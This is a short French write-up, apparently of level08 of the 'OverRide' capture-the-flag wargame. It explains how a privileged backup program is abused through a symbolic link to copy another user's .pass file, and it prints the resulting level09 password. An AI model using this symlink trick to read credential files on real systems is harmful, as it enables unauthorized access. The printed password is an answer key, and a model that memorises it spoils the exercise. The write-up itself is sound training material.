#### Etape 1 : Décompilation

Le programme ouvre un fichier,si il est lisible le programme effectue une copie dans un dossier "backups" et ajoute des logs concernant la réussite de la copie dans un fichier ".logs".

#### Etape 2 : Objectif

Lire le fichier .pass du niveau suivant pour obtenir le mot de passe.

#### Etape 3 : Tests

Il n'est pas possible de lire directement le fichier faute de droit d'utilisateur.
```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

#### Etape 4 : Solution

Il suffit de créer un lien symbolique vers le fichier en question.
(Ne pas oublier de ce donner les droits dans le dossier racine : chmod 777 .)

#### Etape 5 : Execution 

```bash
level08@OverRide:~$ ln -s /home/users/level09/.pass solution
level08@OverRide:~$ ./level08 solution
level08@OverRide:~$ cat ./backups/solution 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```